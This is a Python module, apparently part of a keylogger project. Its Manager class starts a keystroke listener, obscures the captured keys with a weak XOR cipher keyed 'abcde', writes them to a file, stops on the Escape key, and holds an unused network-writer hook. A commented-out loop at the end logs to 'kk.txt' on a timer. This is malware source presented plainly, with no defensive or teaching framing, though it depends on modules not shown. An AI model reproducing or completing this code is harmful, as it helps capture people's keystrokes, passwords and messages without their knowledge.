import datetime
import time
import threading

from key_logger_agent.key_writer import FileWriter
# from key_encryption import Data
from key_writer import FileWriter
from key_listener import Listener
from key_encryption import Encryption

class Manager:

    def __init__(self, listener: Listener, writer: FileWriter,networkwriter, space: int,):
        self.listener = listener
        self.writer = writer
        self.networkwriter= networkwriter
        self.space = space
        self.enc = None
        self.key= None
    def run(self):
        self.listener.start_logging()

    def encr(self):
        self.enc = Encryption()
        return self.enc.xor_encrypt_decrypt(str(self.listener.keys),'abcde')

    def write(self, data):
        self.writer.up_to_file(self.encr())
        self.listener.keys = []

    def stop_loged(self):
        self.key = self.listener.key
        # print(self.key)
        if str(self.key) == 'Key.esc':
            exit()







# listener = Listener()
# writer= FileWriter('kk.txt')
# def p(l, w):
#
#     m= Manager(l,w,5)
#     m.run()
#     while True:
#         m.stop_loged()
#         time.sleep(m.space)
#         m.write(l.keys)
#
#
# p(listener,writer)


